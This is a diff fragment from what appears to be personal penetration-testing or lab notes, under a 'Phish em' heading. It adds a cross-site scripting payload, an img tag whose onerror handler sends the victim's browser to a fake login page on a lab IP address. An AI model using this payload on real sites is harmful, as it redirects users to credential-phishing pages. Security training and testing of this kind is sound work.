@@ -909,7 +909,8 @@ box.appendChild(image);
 
 ### Phish em
 
-- in list this worked
+- xss with
+
 `<img src='x' onerror='window.location.href="http://192.168.49.105/login3.html"'>`
 
 ```html
